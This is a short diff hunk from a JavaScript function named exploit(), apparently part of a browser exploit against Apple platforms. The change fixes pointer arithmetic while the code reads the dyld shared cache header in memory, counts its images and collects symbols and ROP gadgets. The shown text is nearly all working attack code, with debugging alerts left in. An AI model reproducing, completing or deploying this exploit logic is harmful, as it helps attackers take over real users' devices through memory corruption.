@@ -648,7 +648,7 @@ function exploit(){
 
         var syms = {};
         var gadgets = {};
-        var imgs  = hdr + memory.u32(hdr + 0x18);
+        var imgs  = Add(hdr,memory.u32(Add(hdr,0x18)));
        // alert(Add(hdr, r32(Add(hdr,0x18))))
         alert("dyld cache images@" + imgs);
         var nimgs = memory.u32(hdr + 0x1c);
